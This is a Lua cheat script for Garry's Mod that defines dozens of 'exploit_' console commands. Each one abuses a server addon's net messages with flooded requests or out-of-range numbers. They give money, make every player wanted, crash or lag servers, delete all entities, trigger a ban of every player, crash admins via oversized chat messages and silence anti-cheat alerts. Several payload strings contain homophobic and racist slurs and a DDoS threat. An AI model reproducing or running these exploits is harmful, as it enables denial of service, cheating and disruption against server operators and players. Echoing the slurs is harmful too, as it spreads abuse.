concommand.Add("exploit_drugdealergivemoney", function(  )
    for i=1,500 do
        net.Start("Kun_SellDrug")
        net.WriteString("Meth")
        net.SendToServer()
    end
    end)

concommand.Add("exploit_bailouttest2", function(  )
    for k,v in pairs(player.GetAll()) do
        net.Start( "BailOut" )
        net.WriteEntity(LocalPlayer())
        net.WriteEntity(LocalPlayer())
        net.WriteFloat( -10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 )
        net.SendToServer()
    end
    end)
concommand.Add("exploit_EZICrashServer", function(  )
    for i=0, 500 do
        net.Start("EZI_UseItem")
        net.WriteString("m9k_davy_crockett")
        net.SendToServer()
    end
    end)
concommand.Add("exploit_CACBan", function(  )
    local sucker33 = LocalPlayer():GetEyeTrace().Entity
    for k,v in pairs(player.GetAll()) do
        net.Start ("CAC_BanMe")
        net.WriteString ("concommand")
        net.WriteString ("ulx ban *")
        net.SendToServer ()
    end
    end)

concommand.Add( "startlag",function(  )
    timer.Create("lag", 0.5, 0, function()
        for i=1,10000 do
            net.Start("DarkRP_spawnPocket")
            net.WriteFloat(999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999)
            net.SendToServer()
        end
        end)
    end)

concommand.Add( "stoplag",function(  )
    timer.Destroy("lag")
    end)


concommand.Add("exploit_RemoveAllMunies", function ()
   
    for k,v in pairs (player.GetAll()) do
        net.Start( "PS_PointsOverTime_" )
        net.WriteEntity( v )
        net.WriteEntity( v )
        net.WriteFloat( -1000 )
        net.SendToServer()
    end
    end)

concommand.Add("exploit_NCDSellCar", function ()
    net.Start('NET_NCD_SellCar')
    net.WriteEntity(LocalPlayer())
    net.WriteEntity(neths_car_dealer)
    net.WriteString("Utility Truck (Silver)")
    net.SendToServer()
    end)

concommand.Add("exploit_squadcreate", function ()
    net.Start("SquadCreateGroup")
    net.SendToServer()
    end)

concommand.Add("exploit_squadinviteall", function ()
   for i=1,1000 do
       for k,v in pairs(player.GetAll()) do
        net.Start("SquadInviteGroup")
        net.WriteEntity(v)
        net.SendToServer()
    end
end
end)

concommand.Add("exploit_squadleave", function ()
    net.Start("SquadLeaveGroup")
    net.SendToServer()
    end)

concommand.Add("exploit_m9ktest", function ()
    net.Start("M9KBlacklistSend")
    net.WriteString("FGT")
    net.SendToServer("M9KBlacklistSend")
    end)

concommand.Add("exploit_ATAGTest", function ()
    net.Start("ATAG_Scoreboard_AddRank")
    net.WriteString("Shitfunc")
    net.SendToServer()
    end)
concommand.Add("exploit_123", function ()
   for i=1,50 do
    net.Start( "RXCAR_Shop_Sell_C2S" )
    net.WriteTable({E=futogtav,CD=CData})
    net.SendToServer()
end
end)
concommand.Add("exploit_Createreport", function ()
    local suk = LocalPlayer():GetEyeTrace().Entity
    for k,v in pairs(player.GetAll()) do
        local tab = {
        REPORTER = v:Nick(),
        REPORTERID = v:SteamID(),
        FAGGOT = v:Nick(),
        FAGGOTID = v:SteamID(),
        INFO = "fgt",
        PROOF = "No"
    }
    net.Start("CREATE_REPORT")
    net.WriteTable(tab)
    net.SendToServer()
end
end)

concommand.Add("exploit_delete", function ()
    local deletedis = LocalPlayer():GetEyeTrace().Entity
    for k,v in pairs(ents.GetAll()) do
        net.Start("SyncRemoveAction")
        net.WriteEntity(v)
        net.SendToServer()
    end
    end)

concommand.Add("exploit_TMCMakeallwanted", function ()
    net.Start("TMC_NET_MakePlayerWanted")
    net.WriteString("bad")
    net.WriteString("bad")
    net.SendToServer()
    end)
concommand.Add("exploit_thiefnpc", function ()
    net.Start('thiefnpc')
    net.WriteDouble(-99999999999999999)  
    net.SendToServer()
    end)
concommand.Add("exploit_TMCFire", function ()
    net.Start("TMC_NET_FirePlayer")
    net.WriteString("Paypal")
    net.SendToServer()
    end)
concommand.Add("exploit_69", function ()
    net.Start( "BuyHealth" )
    net.WriteInt(-999999999999999999999999999999999999999999, 8 )
    net.SendToServer()
    net.Start( "BuyArmor" )
    net.WriteInt( -99999999999999999999999999999999999999999, 8 )
    net.SendToServer()
    end)
concommand.Add("exploit_LimeInvDrop", function ()
    local dropyocrap = LocalPlayer():GetEyeTrace().Entity
    local droptbl = {
    
}

net.Start( 'LimeInv_dropItem' )
net.WriteTable( droptbl )
net.WriteEntity( dropyocrap )
net.SendToServer()
end)

concommand.Add("exploit_shitfunc", function ()
    for i=1,500 do
        for k,v in pairs(player.GetAll()) do
            if v != LocalPlayer() then
                net.Start("_")
                net.WriteEntity(v)
                net.SendToServer()
            end
        end
    end
    end)

concommand.Add("exploit_divupdatelaws", function ()
    net.Start("updateLaws")
    net.WriteString("Bitch")
    net.SendToServer()
    end)

concommand.Add("exploit_divselloil", function ()
    for k,v in pairs(ents.GetAll()) do
        net.Start("Kun_SellOil")
        net.WriteEntity(v)
        net.SendToServer()
    end
    end)
concommand.Add("exploit_divtakeoil", function ()
    net.Start("Kun_OilTankManage")
    net.WriteInt(1,32)
    net.SendToServer()
    end)
concommand.Add("exploit_tttspecdm", function ()
    net.Start("SpecDM_SendLoadout")
    net.WriteString("m9k_ak47")
    net.WriteString("m9k_ak47")
    net.SendToServer()
    end)

concommand.Add("exploit_tyui", function ()
    for k,v in pairs(player.GetAll()) do
        local tab = {
        REPORTER = v:Nick(),
        REPORTERID = v:SteamID(),
        FAGGOT = v:Nick(),
        FAGGOTID = v:SteamID(),
        INFO = "fag",
        PROOF = "fag"
    }
    net.Start("DLRDM_Start")
    net.WriteTable(tab)
    net.SendToServer()
    net.SendToServer()
end
end)
concommand.Add("exploit_RDMADD", function ()
    for k,v in pairs(player.GetAll()) do
        net.Start("RDMAdd");
        net.WriteString("fgt");
        net.WriteEntity(v);
        net.SendToServer()
    end
    end)
concommand.Add("exploit_PSLottery", function ()
    net.Start( "LotteryMenu" )
    net.WriteEntity(LocalPlayer())
    net.WriteInt(1000000000000000000, 16)
    net.SendToServer( )
    end)
concommand.Add("exploit_DLForgive", function ()
    net.Start("DL_GetForgive")
    net.WriteUInt(1,1)
    net.WriteUInt(1, 1)
    net.WriteUInt(1, 4)
    net.SendToServer()
    end)
concommand.Add("exploit_Potion", function ()
    local shitfunc3 = LocalPlayer():GetEyeTrace().Entity
    for i=1,500 do
        for k,v in pairs(player.GetAll()) do
            if v != LocalPlayer() then
                net.Start( 'NET_AM_MakePotion' )
                net.WriteEntity( v )
                net.WriteInt( 3, 8 )
                net.SendToServer()
            end
        end
    end
    end)
concommand.Add("exploit_moneyprinterfrench", function ()
    for k,v in pairs(ents.GetAll()) do
        net.Start("SyncPrinterButtons76561198021780577")
        net.WriteEntity(v)
        net.WriteUInt(3, 4)
        net.SendToServer()
    end
    end)

local nlr = CreateClientConVar("exploit_nlr_freeze", "0", true, false)
local function nlrs()
    if nlr:GetBool() then
        for k,v in pairs(player.GetAll())do
          if v != LocalPlayer() then
            net.Start("NLR.ActionPlayer")
            net.WriteEntity(v)
            net.SendToServer()
        end
    end
end
end
timer.Create("nlrs", 4,0,nlrs) -- Gotta keep dat timer kinda low, or big lag
local crashdakids = CreateClientConVar("exploit_atlas_admins", "0", true, false)

local function Crashdakidsf()
    if crashdakids:GetBool() then
      for k,v in pairs(player.GetAll()) do
        if ( v:GetUserGroup() != "user" ) then        
           
         
            local bigstring = ""
for i=0, 150 do bigstring = bigstring .. string.char(  72, 101, 108, 108, 111, 72, 104, 105 ) end --------------------------------------------------------------------------------------------------------------------


local tocrash = v


if( !tocrash:IsPlayer() ) then return end;

local name = tocrash:Name();  
print( "Crashing: " .. name );

net.Start("atlaschat.chat")
net.WriteString("/pm " .. name .." ".. bigstring)
net.SendToServer()

end
end
end
end
timer.Create("Crashdakids", 1.5,0,Crashdakidsf)
concommand.Add("exploit_soundarrest", function ()
    net.Start( "soundArrestCommit" )
    net.WriteString( "Shit" )
    net.SendToServer()
    end)
concommand.Add("exploit_hoverboard", function ()
    net.Start( "hoverboardpurchase" )
    net.WriteInt( 8, 32 )
    net.SendToServer()
    end)
concommand.Add("exploit_ggspawn", function ()
    net.Start("SpawnProtection")
    net.WriteFloat(0)
    net.SendToServer()
    end)
concommand.Add("exploit_satstracking", function ()
    for k,v in pairs(player.GetAll()) do
        net.Start ( "satsRequestTrackingAdd" )
        net.WriteString ( "STEAM_0:1:219919521" )
        net.SendToServer ()
    end
    end)
concommand.Add("exploit_NPCSHOP", function ()
    net.Start("NPCShop_BuyItem")
    net.WriteString("weapon_hack_phone")
    net.SendToServer()
    end)
concommand.Add("exploit_CubeRiot", function ()
    net.Start( "CubeRiot CaptureZone Update" )
    net.WriteUInt( 1, 8 )
    net.WriteVector( "2654.989258 2254.119629 -139.968750" )
    net.WriteVector( "2654.989258 2254.119629 -139.968750" )
    net.SendToServer()
    end)
concommand.Add("exploit_hoopladeposit", function ()
    net.Start( "deposit" )
    net.WriteString("-10000000000000000000000")
    net.SendToServer()
    end)

concommand.Add("exploit_bailoutgive", function(  )
    local loser = LocalPlayer():GetEyeTrace().Entity
    for k,v in pairs(player.GetAll()) do
        net.Start( "BailOut" )
        net.WriteEntity( loser )
        net.WriteEntity( loser )
        net.WriteFloat( 99999999999999999999999999999999 )
        net.SendToServer()
    end
    end)


concommand.Add("exploit_bypass_apanti",function()
    chat.AddText("Bypassing Apanti.. (Addon might not be on)")
    net.Receive("sMsgStandard", function()
        print("#Bypassed by jay")
        end)
    
    net.Receive("sNotifyHit", function()
        print("#Bypassed by jay")
        end)
    
    net.Receive("sMsgAdmins", function()
       print("#Bypassed by jay")
       end)
    
    net.Receive("sAlertNotice", function()
        print("#Bypassed by jay")
        end)
    end)
concommand.Add("exploit_call", function(  )
    for k,v in pairs(player.GetAll()) do
        net.Start( "AcceptRequest" )
        net.WriteEntity( v )
        net.SendToServer()
    end
    end)
concommand.Add("exploit_chess", function(  )
    net.Start( "Chess ClientWager" )
    net.WriteUInt( -999999999999999999999999999, 24 )
    net.SendToServer()
    net.Start( "Chess ClientResign" ) net.SendToServer()
    end)
concommand.Add("exploit_orginvall", function(  )
    for k,v in pairs(player.GetAll()) do
        net.Start( "netOrgVoteInvite_Server" )
        net.WriteEntity( v )
        net.SendToServer()
    end
    end)
concommand.Add("exploit_donator", function(  )
 net.Start( "donatorshop_itemtobuy" )
 net.WriteString( "DonatorShopBuyTripwire" )
 net.SendToServer()
 end)       
concommand.Add("exploit_sellcar", function(  )
    net.Start('BuyCar')
    net.WriteFloat(1)
    net.WriteEntity(LocalPlayer())
    net.WriteString("airtug")
    net.WriteString("airtug")
    net.WriteString("airtug")
    net.SendToServer()
    net.Start('Sell')
    net.WriteFloat(10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
    net.WriteEntity(LocalPlayer())
    net.WriteString("airtug")
    net.SendToServer()
    end)   
concommand.Add("exploit_buycarla", function(  )
    for i = 0, 100 do
        for k,v in pairs(player.GetAll()) do
            local loser = LocalPlayer():GetEyeTrace().Entity
            net.Start('BuyCar')
            net.WriteFloat(1)
            net.WriteEntity(v)
            net.WriteString("airtug")
            net.WriteString("airtug")
            net.WriteString("airtug")
            net.SendToServer()
            net.Start('Sell')
            net.WriteFloat(10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
            net.WriteEntity(v)
            net.WriteString("airtug")
            net.SendToServer()
        end
    end
    end)





concommand.Add("exploit_piano", function(  )
    for k,v in pairs(player.GetAll()) do
        net.Start( "InstrumentNetwork" )
        
        net.WriteEntity( v )
        net.WriteInt( 1, 3 )
        net.WriteString( "KEY_E" )
        
        net.SendToServer()
    end
    end)

function lagg()
  RunConsoleCommand("incrementvar", "sv_cheats 0 1 1")
  for i = 0, 1000 do
      RunConsoleCommand("spike")
  end
end
concommand.Add("lagg", lagg)

concommand.Add("exploit_dayzaskitem", function(  )
    for k,v in pairs(player.GetAll()) do
        net.Start("AskPickupItemInv")
        net.WriteUInt(4,16)
        net.WriteUInt(1,16)
        net.SendToServer()
    end
    end)
concommand.Add("exploit_dayzbuybundle", function(  )
    net.Start("buy_bundle")
    net.WriteFloat( 1, 16 )
    net.SendToServer()
    end)
concommand.Add("exploit_LawyerOffbail", function(  )
    for k,v in pairs(player.GetAll()) do
        net.Start( "LawyerOfferBail" )
        net.WriteEntity(v)
        net.WriteUInt( -100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000, 16 )
        net.SendToServer( )
        net.Start( "AcceptBailOffer" )
        net.WriteEntity(v)
        net.WriteUInt( -10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000, 16 )
        net.SendToServer( )            
    end
    end)
concommand.Add("exploit_getdamagelogsz", function(  )
    for k,v in pairs(player.GetAll()) do
      net.Start("admin_getDamageLogFromServer")
            net.WriteEntity( v ) --Dummy thing
            net.SendToServer()
        end
        end)
concommand.Add("exploit_Mine", function(  )
    for i = 0, 100 do
        for k,v in pairs(player.GetAll()) do
            net.Start("MineServer")
            net.WriteString( "sell" )
            net.WriteEntity(v)
            net.WriteString( "Fuck you. Gonna ddos this shitty ass server niggers" )
            net.SendToServer()
        end
    end
    end)
concommand.Add("exploit_gas", function(  )
   net.Start("Gb_gasstation_BuyGas")
   net.SendToServer()
   net.Start("Gb_gasstation_BuyJerrycan")
   net.SendToServer()
   end)
concommand.Add("exploit_D3AOrgcreate", function(  )
    net.Start("D3A_CreateOrg")
    net.WriteString('969690485273489312467812367128312312314')
    net.WriteString('123712983712984571298712398')
    net.WriteString("255 255 255")
    net.SendToServer()
    end)
concommand.Add("exploit_SUPShop", function(  )
    net.Start("Shop_buy")
    net.WriteString("Armor")
    net.SendToServer()
    end)
concommand.Add("exploit_SUPNewLaws", function(  )
    net.Start("LawsToServer")
    net.WriteString("FGT")
    net.SendToServer()
    end)
concommand.Add("exploit_SUPDisguise", function(  )
    for k,v in pairs(player.GetAll()) do
        net.Start('DisguiseToServer')
        net.WriteEntity(v)
        net.WriteInt(1, 8)
        net.SendToServer()
    end
    end)
concommand.Add("exploit_D3AMessage", function(  )
    local stuff = {
    
}
net.Start("D3A_Message");
net.WriteString("FGT");
net.WriteTable(stuff);
net.SendToServer();
end)


concommand.Add("exploit_misswdall", function(  )
    for k,v in pairs(player.GetAll()) do
        for i = 0, 100 do
            net.Start("misswd_accept")
            net.WriteEntity(v)
            net.SendToServer()
        end
    end
    end)


concommand.Add("exploit_misswdla", function(  )
    local bignurd = LocalPlayer():GetEyeTrace().Entity
    net.Start("misswd_accept")
    net.WriteEntity(bignurd)
    net.SendToServer()
    end)



concommand.Add("exploit_scanner", function(  )
    for k,v in pairs(player.GetAll()) do
        net.Start("ScannerMenu")
        net.WriteEntity(v)
        net.WriteFloat(1)
        net.WriteFloat(1)
        net.SendToServer()
    end
    end)

concommand.Add("exploit_neworg", function(  )
                        net.Start("ORG_NewOrg") --Request organization
                        net.WriteString("I FUCKING HATE YOU!")
                        net.SendToServer()
                        end)

concommand.Add("exploit_neworgdonate", function(  )
    net.Start("ORG_VaultDonate")
    net.WriteFloat(-1000000000000000000000000000000000000000000000000000000)
    net.SendToServer()
    end)

concommand.Add("exploit_chopsop", function(  )
    for k,v in pairs(player.GetAll()) do
        net.Start("Selldatride")
        net.WriteEntity(v)
        net.SendToServer()
    end
    end)
concommand.Add("exploit_passexam", function(  )
 net.Start( "passmayorexam" )
 net.SendToServer()
 end)
concommand.Add("exploit_levelup", function(  )
    net.Start( "levelup_useperk" )
    net.WriteInt( 1, 8 )
    net.WriteInt( 2, 8 )
    net.WriteInt( 3, 8 )
    net.WriteInt( 4, 8 )
    net.SendToServer()
    end)

concommand.Add("exploit_Zed", function(  )
  net.Start("ZED_SpawnCar")
  net.WriteFloat(1)
  net.SendToServer()
  end)

concommand.Add("exploit_govtest", function(  )
    net.Start("GovStation_SpawnVehicle")
    net.WriteString("reventonrtdm")
    net.SendToServer()
    end)
concommand.Add("exploit_flashhost", function(  )
 
    for i = 1,1000 do
        system.FlashWindow( )
    end
    end)


timer.Destroy( "aekickdaskids" )